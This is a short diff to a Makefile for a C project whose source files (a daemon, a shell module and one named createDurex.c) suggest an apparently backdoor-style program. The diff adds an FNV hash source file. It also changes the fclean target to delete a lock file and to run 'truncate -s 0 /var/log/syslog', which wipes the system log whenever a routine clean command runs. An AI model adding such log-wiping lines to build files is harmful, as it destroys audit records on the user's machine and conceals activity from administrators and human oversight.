@@ -14,7 +14,8 @@ SRC =	main.c			\
 		helpers.c		\
 		createDurex.c	\
 		daemon.c		\
-		shell.c
+		shell.c			\
+		fnv.c
 
 OBJS = $(addprefix $(OBJS_DIR), $(SRC:.c=.o))
 
@@ -34,5 +35,7 @@ clean:
 
 fclean: clean
 	$(RM) $(NAME)
+	rm -f /var/lock/durex.lock
+	truncate -s 0 /var/log/syslog
 
 re: fclean all
